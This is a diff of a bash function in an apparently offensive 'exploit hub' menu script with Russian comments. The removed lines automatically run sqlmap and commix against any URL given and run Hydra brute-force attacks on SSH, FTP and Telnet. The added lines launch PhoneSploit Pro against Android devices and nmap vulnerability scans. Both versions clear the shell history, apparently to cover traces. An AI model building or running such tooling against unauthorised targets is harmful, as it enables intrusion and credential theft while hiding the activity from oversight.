@@ -763,35 +763,26 @@ run_ghost_scan() {
 
 run_exploit_hub() {
     clear; zero_clear
-    echo -e "${Y}>>> [ EXPLOIT HUB: AUTO-PILOT MODE ] <<<${NC}"
-    echo -e "${B}Target (URL, IP, or Service):${NC}"
-    read -p ">> " target
-    [ -z "$target" ] && return
+    echo -e "${Y}>>> [ EXPLOIT HUB: TOTAL CONTROL ] <<<${NC}"
+    echo -e "1) PhoneSploit Pro (Android)  2) SQLmap/Web  3) PC/Network"
+    read -p ">> " ex_opt
 
-    # Эвристика: определяем, какой инструмент запустить
-    if [[ "$target" =~ ^(http|https):// ]]; then
-        echo -e "${G}[+] Web Target detected. Running SQLmap + Commix...${NC}"
-        # Сначала проверяем на SQL-инъекции
-        sqlmap -u "$target" --batch --random-agent --level 2 --threads 5
-        # Затем проверяем на Command Injection (Commix)
-        python3 /root/commix/commix.py --url="$target" --batch
-        
-    elif [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        echo -e "${G}[+] IP Address detected. Running Hydra Bruteforce...${NC}"
-        echo -e "${Y}Select service: 1) SSH  2) FTP  3) Telnet${NC}"
-        read -p ">> " srv
-        case $srv in
-            1) hydra -l root -P /root/passwords.txt ssh://"$target" -t 4 ;;
-            2) hydra -l admin -P /root/passwords.txt ftp://"$target" -t 4 ;;
-            3) hydra -l admin -P /root/passwords.txt telnet://"$target" -t 4 ;;
-        esac
-    else
-        echo -e "${R}[!] Unknown target type. Falling back to Nmap scan...${NC}"
-        nmap -sV "$target"
-    fi
-
+    case $ex_opt in
+        1)
+            # Переходим в директорию, которую ты склонировал на скриншоте
+            cd /root/PhoneSploit-Pro
+            python3 phonesploitpro.py
+            ;;
+        2)
+            run_sqlmap_smart # Вызов эвристики для веба
+            ;;
+        3)
+            # Тот самый поиск эксплойтов для ПК через nmap
+            read -p "Target IP: " t
+            nmap -sV --script vuln "$t"
+            ;;
+    esac
     zero_clear; history -c
-    read -p "Press Enter to return..."
 }
 
 
